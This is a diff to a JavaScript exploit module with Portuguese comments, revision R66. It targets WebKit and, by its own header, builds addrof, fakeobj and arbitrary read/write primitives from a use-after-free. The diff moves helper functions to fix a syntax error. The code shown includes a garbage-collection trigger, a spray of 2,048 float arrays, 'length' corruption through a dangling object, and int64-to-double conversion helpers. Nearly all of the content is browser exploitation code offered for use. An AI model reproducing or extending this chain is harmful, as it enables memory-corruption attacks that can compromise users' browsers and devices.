@@ -1,27 +1,96 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R65 - Construção de Primitivas Definitivas)
+// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R66 - Correção de Sintaxe)
 // =======================================================================================
-// ESTA VERSÃO É UMA IMPLEMENTAÇÃO COMPLETA E ROBUSTA PARA CRIAR UM CONJUNTO
-// DE PRIMITIVAS DE EXPLORAÇÃO 100% FUNCIONAIS.
-// - FASE 1: Usa uma nova técnica (corrupção de 'length') para vincular de forma confiável a referência UAF.
-// - FASE 2: Constrói e valida 'addrof' e 'fakeobj'.
-// - FASE 3: Usa as primitivas da FASE 2 para construir 'arb_read' e 'arb_write'.
-// - FASE 4: Realiza um teste de R/W completo para validar todo o conjunto de ferramentas.
+// O R65 falhou devido a um erro de sintaxe (funções duplicadas).
+// ESTA VERSÃO CORRIGE O ERRO DE 'Identifier has already been declared'.
+// - As funções auxiliares foram movidas para o topo do arquivo e definidas apenas uma vez.
+// - A lógica de exploração da R65 foi mantida intacta, pois ainda não foi testada.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R65_Full_Primitives";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R66_Syntax_Fix";
 
-function int64ToDouble(int64) { /* ... (código completo no final) ... */ }
-function doubleToInt64(d) { /* ... (código completo no final) ... */ }
+// --- Definições de Funções Auxiliares (Definidas uma única vez) ---
+function int64ToDouble(int64) {
+    const buf = new ArrayBuffer(8);
+    const u32 = new Uint32Array(buf);
+    const f64 = new Float64Array(buf);
+    u32[0] = int64.low();
+    u32[1] = int64.high();
+    return f64[0];
+}
+
+function doubleToInt64(d) {
+    const buf = new ArrayBuffer(8);
+    const f64 = new Float64Array(buf);
+    const u32 = new Uint32Array(buf);
+    f64[0] = d;
+    return new AdvancedInt64(u32[0], u32[1]);
+}
+
+async function triggerGC_Tamed() {
+    logS3("    Acionando GC Domado (Tamed)...", "info");
+    try {
+        const gc_trigger_arr = [];
+        for (let i = 0; i < 500; i++) {
+            const size = Math.min(1024 * i, 1024 * 1024);
+            gc_trigger_arr.push(new ArrayBuffer(size)); 
+            gc_trigger_arr.push(new Array(size / 8).fill(0));
+        }
+    } catch (e) { /* ignora */ }
+    await PAUSE_S3(500);
+}
+
+async function triggerAndLinkUncagedArrayUAF() {
+    let leaker_obj = null;
+    let confused_arr = null;
+
+    function createDanglingPointer() {
+        function createScope() {
+            const victim_obj = { p0: null, p1:null, p2:null, p3:null };
+            leaker_obj = victim_obj; 
+        }
+        createScope();
+    }
+
+    createDanglingPointer();
+    await triggerGC_Tamed();
+
+    const spray_arrays = [];
+    for (let i = 0; i < 2048; i++) {
+        spray_arrays.push([1.1]);
+    }
+    
+    logS3("    Procurando por array reutilizado via corrupção de 'length'...", "info");
+    leaker_obj.p0 = int64ToDouble(new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF));
+
+    for (const arr of spray_arrays) {
+        if (arr.length > 1) {
+            confused_arr = arr;
+            logS3(`    Array vinculado encontrado! Novo length: ${arr.length}`, "good");
+            break;
+        }
+    }
+    
+    if (!confused_arr) {
+        throw new Error("Falha ao encontrar o array reutilizado na memória (verificação de length).");
+    }
+
+    // Restaura o 'length' e limpa a propriedade para uso futuro.
+    confused_arr[0] = int64ToDouble(new AdvancedInt64(0x100000001, 0)); 
+    leaker_obj.p0 = null;
+
+    return { leaker_obj, confused_arr };
+}
+
 
 // =======================================================================================
-// FUNÇÃO ORQUESTRADORA PRINCIPAL (R65)
+// FUNÇÃO ORQUESTRADORA PRINCIPAL (R66)
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
-    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R65_Full_Primitives;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Construção Definitiva (R65) ---`, "test");
+    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Correção de Sintaxe (R66) ---`, "test");
     
     let final_result = { success: false, message: "A cadeia UAF não obteve sucesso." };
 
@@ -76,79 +145,4 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
 
     logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
     return { errorOccurred: final_result.success ? null : final_result.message, addrof_result: final_result };
-}
-
-// --- Funções Auxiliares ---
-async function triggerGC_Tamed() {
-    logS3("    Acionando GC Domado (Tamed)...", "info");
-    try {
-        const gc_trigger_arr = [];
-        for (let i = 0; i < 500; i++) {
-            const size = Math.min(1024 * i, 1024 * 1024);
-            gc_trigger_arr.push(new ArrayBuffer(size)); 
-            gc_trigger_arr.push(new Array(size / 8).fill(0));
-        }
-    } catch (e) { /* ignora */ }
-    await PAUSE_S3(500);
-}
-
-async function triggerAndLinkUncagedArrayUAF() {
-    let leaker_obj = null;
-    let confused_arr = null;
-
-    function createDanglingPointer() {
-        function createScope() {
-            const victim_obj = { p0: null, p1:null, p2:null, p3:null };
-            leaker_obj = victim_obj; 
-        }
-        createScope();
-    }
-
-    createDanglingPointer();
-    await triggerGC_Tamed();
-
-    const spray_arrays = [];
-    for (let i = 0; i < 2048; i++) {
-        spray_arrays.push([1.1]);
-    }
-    
-    logS3("    Procurando por array reutilizado via corrupção de 'length'...", "info");
-    // Um valor grande que provavelmente irá sobrescrever o campo 'length' do array
-    leaker_obj.p0 = int64ToDouble(new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF));
-
-    for (const arr of spray_arrays) {
-        if (arr.length > 1) { // O 'length' original era 1. Se mudou, encontramos.
-            confused_arr = arr;
-            logS3(`    Array vinculado encontrado! Novo length: ${arr.length}`, "good");
-            break;
-        }
-    }
-    
-    if (!confused_arr) {
-        throw new Error("Falha ao encontrar o array reutilizado na memória (verificação de length).");
-    }
-
-    // Restaura o 'length' para evitar crashes e prepara para uso
-    confused_arr[0] = int64ToDouble(new AdvancedInt64(0x100000001, 0)); // butterfly_ptr(length=1)
-    leaker_obj.p0 = null;
-
-    return { leaker_obj, confused_arr };
-}
-
-// Definições completas das funções auxiliares
-function int64ToDouble(int64) {
-    const buf = new ArrayBuffer(8);
-    const u32 = new Uint32Array(buf);
-    const f64 = new Float64Array(buf);
-    u32[0] = int64.low();
-    u32[1] = int64.high();
-    return f64[0];
-}
-
-function doubleToInt64(d) {
-    const buf = new ArrayBuffer(8);
-    const f64 = new Float64Array(buf);
-    const u32 = new Uint32Array(buf);
-    f64[0] = d;
-    return new AdvancedInt64(u32[0], u32[1]);
 }
